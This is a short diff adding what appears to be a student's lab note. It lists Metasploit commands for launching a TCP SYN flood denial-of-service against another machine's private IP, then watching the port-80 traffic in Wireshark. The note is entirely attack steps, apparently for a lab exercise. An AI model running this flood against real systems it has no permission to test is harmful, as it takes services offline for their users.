@@ -1,0 +1,12 @@
+open in kali
+msfconsole
+msf5>
+msf5>search synflood
+msf5>use auxiliary/dos/tcp/synflood
+msf5 auxiliary(dos/tcp/synflood)> show options
+----------||-------------------->set RHOSTS 192.168.80.1(dushre m/c ki ip)
+----------||-------------------->show options
+----------||-------------------->exploit
+
+open wireshirk
+tcp.port==80
